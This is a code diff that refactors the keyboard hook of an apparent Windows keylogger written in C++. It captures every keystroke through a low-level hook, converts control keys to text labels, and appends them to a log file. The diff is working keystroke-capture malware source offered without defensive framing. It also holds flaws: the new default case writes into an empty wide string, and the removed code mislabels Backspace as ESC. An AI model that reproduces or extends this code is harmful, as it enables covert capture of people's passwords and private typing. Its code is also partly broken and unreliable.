@@ -6,68 +6,58 @@ static LPCWSTR current_filename;
 
 LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
 {
-	static int last;
-	BOOL letter = 1;
-
 	wchar_t currentKey[10];
+	std::wstring buffer = L"";
+
 	if (nCode == HC_ACTION)
 	{
 		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
 		{
 			PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
 			int code = p->vkCode;
-			if (code == 0xA2)
-			{ // LCTRL or first signal of RALT
-				last = code;
-				return CallNextHookEx(NULL, nCode, wParam, lParam);
-			}
-			if (last == 0xA2 && code == 0xA5)
-			{ // RALT
-				printf("%s", "<RALT>");
-				letter = 0;
-			}
-			else if (last == 0xA2 && code != 0xA5)
+
+			switch (code)
 			{
-				printf("%s", "<LCTRL>");
-			}
-			if (code == 0xA3)
-			{
-				letter = 0;
-				printf("%s", "<RCTRL>");
-			}
-			if (code == 0xA4)
-			{
-				letter = 0;
-				printf("%s", "<LALT>");
-			}
-			if (code == 0xA0)
-			{
-				letter = 0;
-				printf("%s", "<LSHIFT>");
-			}
-			if (code == 0xA1)
-			{
-				letter = 0;
-				printf("%s", "<RSHIFT>");
-			}
-			if (code == 0x08)
-			{
-				letter = 0;
-				printf("%s", "<ESC>");
-			}
-			if (code == 0x0D)
-			{
-				letter = 0;
-				printf("\n");
-			}
-			last = code;
-			if (letter)
-			{
-				wchar_t buffer[2];
+			case VK_RCONTROL:
+				buffer = L"[R-CTRL]";
+				break;
+			case VK_LCONTROL:
+				buffer = L"[L-CTRL]";
+				break;
+			case VK_RMENU:
+				buffer = L"[R-ALT]";
+				break;
+			case VK_LMENU:
+				buffer = L"[L-ALT]";
+				break;
+			case VK_LSHIFT:
+				buffer = L"[L-SHIFT]";
+				break;
+			case VK_RSHIFT:
+				buffer = L"[R-SHIFT]";
+				break;
+			case VK_ESCAPE:
+				buffer = L"[ESC]";
+				break;
+			case VK_DELETE:
+				buffer = L"[DELETE]";
+				break;
+			case VK_BACK:
+				buffer = L"[BACKSPACE]";
+				break;
+			case VK_TAB:
+				buffer = L"[TAB]";
+				break;
+			case VK_RETURN:
+				buffer = L"[ENTER]\n";
+				break;
+			case VK_DECIMAL:
+				buffer = L".";
+				break;
+			default:
 				buffer[0] = code;
-				buffer[1] = '\0';
-				writeToFile(buffer, current_filename);
-			}  
+			}
+			writeToFile((wchar_t*)buffer.c_str(), current_filename);
 		}
 	}
 	time(&end);
